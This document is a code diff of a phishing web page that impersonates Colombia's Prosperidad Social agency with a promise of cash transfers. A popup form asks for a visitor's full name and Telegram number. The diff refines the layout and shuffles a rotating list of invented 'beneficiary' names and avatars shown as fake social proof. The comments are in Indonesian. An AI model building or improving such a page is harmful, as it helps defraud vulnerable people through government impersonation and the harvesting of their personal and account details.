@@ -2,7 +2,6 @@
 
   <div id="triggerContainer" class="text-center" style="background: transparent;">
     <style>
-      /* --- NOTIFIKASI DALAM FORM (BARU) --- */
       #form-notif-container {
         position: absolute;
         top: -30px;
@@ -41,9 +40,7 @@
         object-fit: cover;
       }
 
-      .inner-content {
-        text-align: left;
-      }
+      .inner-content { text-align: left; }
 
       .inner-name {
         font-size: 13px;
@@ -69,26 +66,29 @@
         margin-right: 4px;
       }
 
-      /* --- STYLE ASLI (TIDAK DIUBAH) --- */
       .hero-slider {
         width: 100%;
-        max-width: 600px;
+        max-width: 500px;
         margin: 0 auto 20px;
-        border-radius: 15px;
+        border-radius: 37px;
         overflow: hidden;
         box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
       }
 
       .carousel-item img {
         width: 100%;
-        height: 350px;
+        height: auto;
         object-fit: cover;
         display: block;
       }
 
       @media (max-width: 768px) {
+        .hero-slider {
+          max-width: 100%;
+          border-radius: 10px;
+        }
         .carousel-item img {
-          height: 200px;
+          aspect-ratio: 16 / 10; 
         }
       }
 
@@ -112,8 +112,7 @@
         box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
       }
 
-      .btn-init:active,
-      .btn-init.clicked {
+      .btn-init:active, .btn-init.clicked {
         background: #000 !important;
         color: #fff !important;
         transform: scale(0.98);
@@ -122,10 +121,8 @@
       #modalOverlay {
         display: none;
         position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
         background: rgba(0, 0, 0, 0.6);
         z-index: 10000;
         align-items: center;
@@ -148,10 +145,7 @@
         transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
       }
 
-      #mainFormContainer.show {
-        opacity: 1;
-        transform: scale(1);
-      }
+      #mainFormContainer.show { opacity: 1; transform: scale(1); }
     </style>
 
     <div class="hero-slider">
@@ -165,11 +159,8 @@
       </div>
     </div>
 
-    <h1>A través de este enlace, Prosperidad Social distribuirá transferencias de efectivo a los ciudadanos colombianos
-      elegibles.</h1>
-    
+    <h1 style="font-size: 20px; padding: 0 10px;">A través de este enlace, Prosperidad Social distribuirá transferencias de efectivo a los ciudadanos colombianos elegibles.</h1>
     <p style="font-size: 14px; color: #666; font-weight: bold;">¡Regístrese y verifique suelegibilidad!</p>
-
     <button type="button" id="showFormBtn" class="btn btn-init">Consulte aquí si su hogar es beneficiario</button>
   </div>
 
@@ -192,45 +183,34 @@
 
       <div class="mb-4 text-center">
         <h2 style="font-size: 18px; font-weight: 800; color: #212121; margin-bottom: 5px;">Asistencia en Efectivo</h2>
-        <p style="font-size: 14px; color: #666; line-height: 1.4;"> <br><strong
-            style="color: #2c3e50; font-size: 16px;">Complete este formulario para continuar</strong></p>
+        <p style="font-size: 14px; color: #666; line-height: 1.4;"> <br>
+          <strong style="color: #2c3e50; font-size: 16px;">Complete este formulario para continuar</strong>
+        </p>
       </div>
 
-      <p id="wrong" class="text-center mt-2"
-        style="display:none; color: #d32f2f; font-size: 13px; font-weight: 600; background: #ffebee; padding: 8px; border-radius: 8px;">
-        Ingrese un número de telepon válido.</p>
+      <p id="wrong" class="text-center mt-2" style="display:none; color: #d32f2f; font-size: 13px; font-weight: 600; background: #ffebee; padding: 8px; border-radius: 8px;">Ingrese un número de telepon válido.</p>
 
       <div class="mb-3">
-        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Nombre
-          completo</label>
-        <input type="text" name="nama" class="form-control shadow-none" placeholder="Ingrese su nombre completo"
-          style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
+        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Nombre completo</label>
+        <input type="text" name="nama" class="form-control shadow-none" placeholder="Ingrese su nombre completo" style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
       </div>
 
       <div class="mb-3">
-        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Número de
-          Telegram</label>
+        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Número de Telegram</label>
         <div style="position:relative;">
-          <img src="assets/kolombia.png" id="flagIcon"
-            style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 24px; display: none; z-index: 5;">
-          <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Número de Telegram"
-            autocomplete="off" inputmode="numeric" required
-            style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
+          <img src="assets/kolombia.png" id="flagIcon" style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 24px; display: none; z-index: 5;">
+          <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Número de Telegram" autocomplete="off" inputmode="numeric" required style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
         </div>
       </div>
 
       <div class="mb-4" style="display:flex; gap:12px; align-items: flex-start;">
         <input type="checkbox" id="agree" style="width: 20px; height: 20px; accent-color: #000; cursor: pointer;">
-        <label for="agree" style="font-size: 12px; color: #555; line-height: 1.4; cursor: pointer;">Acepto continuar con
-          la solicitud dan el registro oficial.</label>
+        <label for="agree" style="font-size: 12px; color: #555; line-height: 1.4; cursor: pointer;">Acepto continuar con la solicitud dan el registro oficial.</label>
       </div>
 
-      <div id="checkboxWarning"
-        style="display:none; color:#d32f2f; font-size:12px; font-weight:600; text-align:center; margin-bottom:15px;">⚠️
-        Debe marcar la casilla primero</div>
+      <div id="checkboxWarning" style="display:none; color:#d32f2f; font-size:12px; font-weight:600; text-align:center; margin-bottom:15px;">⚠️ Debe marcar la casilla primero</div>
 
-      <button class="btn w-100" id="claimBtn"
-        style="height: 52px; border-radius: 12px; background: #000; color: #fff; font-weight: 800; font-size: 16px; border: none; letter-spacing: 0.5px;">RECLAMAR</button>
+      <button class="btn w-100" id="claimBtn" style="height: 52px; border-radius: 12px; background: #000; color: #fff; font-weight: 800; font-size: 16px; border: none; letter-spacing: 0.5px;">RECLAMAR</button>
     </div>
   </div>
 </div>
@@ -238,7 +218,7 @@
 <script>
   $(document).ready(function () {
 
-    // --- DATA PENERIMA (BARU) ---
+    // --- DATA PENERIMA (16 ORANG MIX ASSET & BLANK) ---
     const listPenerima = [
       { n: "Rosa Mamani", p: "assets/p1.jpg" },
       { n: "Paola Rivas", p: "https://ui-avatars.com/api/?name=P&background=ccc&color=fff" },
@@ -258,42 +238,58 @@
       { n: "Ricardo Peña", p: "https://ui-avatars.com/api/?name=R&background=ccc&color=fff" }
     ];
 
+    // FUNGSI ACAK (SHUFFLE)
+    function shuffle(array) {
+      for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+      }
+      return array;
+    }
+
+    let dataAcak = shuffle([...listPenerima]);
     let idx = 0;
     let notifInterval;
 
     function startInnerNotif() {
       if (notifInterval) clearInterval(notifInterval);
-      notifInterval = setInterval(function () {
-        const user = listPenerima[idx];
+      
+      function trigger() {
+        const user = dataAcak[idx];
         $("#innerAvatar").attr("src", user.p);
         $("#innerUserName").text(user.n);
         $("#innerNotifBox").addClass("show");
 
         setTimeout(function () {
           $("#innerNotifBox").removeClass("show");
-          idx = (idx + 1) % listPenerima.length;
+          idx = (idx + 1) % dataAcak.length;
         }, 2000);
-      }, 4000);
+      }
+
+      trigger(); // Langsung muncul pertama kali
+      notifInterval = setInterval(trigger, 4000);
     }
 
-    // LOGIKA TAMPIL TENGAH (Asli)
+    // LOGIKA TAMPIL TENGAH
     $("#showFormBtn").on("click", function () {
       $(this).addClass("clicked");
+      dataAcak = shuffle([...listPenerima]); // Acak ulang setiap kali dibuka
+      idx = 0;
       setTimeout(function () {
         $("#modalOverlay").css("display", "flex");
         $("#mainFormContainer").show();
         setTimeout(function () {
           $("#mainFormContainer").addClass("show");
-          startInnerNotif(); // Mulai notif saat form muncul
+          startInnerNotif();
         }, 50);
       }, 150);
     });
 
-    // TUTUP POPUP (Asli)
+    // TUTUP POPUP
     $("#modalOverlay").on("click", function (e) {
       if (e.target !== this) return;
       $("#mainFormContainer").removeClass("show");
-      clearInterval(notifInterval); // Berhenti saat form tutup
+      clearInterval(notifInterval);
       setTimeout(function () {
         $("#modalOverlay").hide();
         $("#showFormBtn").removeClass("clicked");
@@ -342,4 +338,3 @@
     }
   });
 </script>
-
